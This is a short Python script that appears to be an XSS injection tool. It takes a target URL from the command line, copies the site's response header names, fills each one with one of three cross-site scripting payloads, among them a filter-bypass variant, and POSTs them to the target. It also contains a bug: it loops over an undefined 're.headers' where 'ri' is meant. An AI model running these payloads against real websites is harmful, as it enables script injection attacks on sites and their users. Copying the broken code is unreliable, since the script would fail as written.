import requests as r 
import sys 

payloads = ['<script>alert(1);</script>','<scrscriptipt>alert(1);</scrscriptipt>', '<BODYONLOAD=alert(1)>']
headers = {} 

try:
	ri = r.head(sys.argv[1])
except:
	ri = r.get(sys.argv[1])

if ri.headers != None:
	for payload in payloads : 
		for header in re.headers : 
			headers[header] = payload
		r.post(sys.argv[1],headers=headers)
